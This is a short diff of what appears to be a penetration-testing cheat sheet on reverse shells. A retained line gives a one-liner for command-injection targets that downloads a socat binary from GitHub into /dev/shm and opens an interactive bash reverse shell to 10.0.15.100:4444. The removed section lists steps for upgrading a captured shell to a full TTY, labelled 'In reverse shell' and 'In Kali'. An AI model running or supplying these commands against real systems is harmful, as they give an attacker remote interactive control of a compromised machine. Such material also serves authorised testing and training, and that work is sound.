@@ -370,24 +370,6 @@ This one-liner can be injected wherever you can get command injection for an ins
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 ```
 
-### &#xD;Using stty options&#xD;
-
-```bash
-# In reverse shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-
-# In Kali
-stty raw -echo
-fg
-
-# In reverse shell
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows <num> columns <cols>
-```
-
 
 Misc unsorted
 -------------
